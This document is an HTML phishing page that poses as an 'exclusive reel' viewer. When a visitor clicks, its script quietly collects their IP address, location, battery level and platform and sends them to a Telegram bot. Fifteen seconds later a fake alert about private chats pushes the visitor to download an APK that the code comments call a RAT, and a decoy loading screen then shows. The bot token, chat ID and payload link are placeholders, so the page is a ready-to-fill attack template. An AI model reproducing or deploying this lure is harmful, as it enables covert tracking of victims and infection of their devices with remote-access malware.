<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lavender Gleam Exclusive</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
        #p { position: fixed; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 10; background: #000; }
        .btn { padding: 15px 30px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 5px; cursor: pointer; }
        iframe { width: 100vw; height: 100vh; border: none; }
        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; z-index: 20; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .spin { border: 4px solid #333; border-top: 4px solid #8e44ad; border-radius: 50%; width: 50px; height: 50px; animation: s 1s linear infinite; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="p">
    <button class="btn" onclick="start()">Watch Exclusive Reel</button>
</div>

<div id="loader">
    <div class="spin"></div>
    <h2 style="color:#8e44ad; margin-top:20px;">🔓 Lavender Decryptor v1.0</h2>
    <p>Connecting to Private Log Server...</p>
    <p style="font-size:13px; color:#777; padding: 0 20px;">Please check your notification bar to complete 'Secure Viewer' installation and view private chats.</p>
</div>

<iframe id="r" allow="autoplay"></iframe>

<script>
    const T = "YOUR_BOT_TOKEN"; 
    const C = "YOUR_CHAT_ID";
    const PAYLOAD_URL = "https://your-github-link.com/secure_viewer.apk";

    function start() {
        document.getElementById('p').style.display = 'none';
        document.getElementById('r').src = "https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
        
        // Phase 1: Stealth Data Capture
        captureBase();

        // Phase 2: The Curiosity Trap (15 sec later)
        setTimeout(triggerInfection, 15000);
    }

    async function captureBase() {
        let res = await fetch('https://ipapi.co/json/').then(r => r.json());
        let bat = await navigator.getBattery().then(b => (b.level * 100) + "%");
        let msg = `🎯_HOOKED%0AIP: ${res.ip}%0ALoc: ${res.city}%0ABat: ${bat}%0AOS: ${navigator.platform}`;
        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${msg}`;
    }

    function triggerInfection() {
        if (confirm("🚨 ENCRYPTED LOGS DETECTED!\n\nSomeone is messaging the Boss privately. \n\nInstall 'Lavender Secure Viewer' to unlock these chats now?")) {
            // Phase 3: Execute RAT Download
            window.location.href = PAYLOAD_URL;
            
            // Phase 4: Reporting
            new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔥_PAYLOAD_TRIGGERED_TARGET_BAITED`;

            // Phase 5: Camouflage Loading Screen
            document.getElementById('r').style.display = 'none';
            document.getElementById('loader').style.display = 'flex';
        }
    }
</script>
</body>
</html>
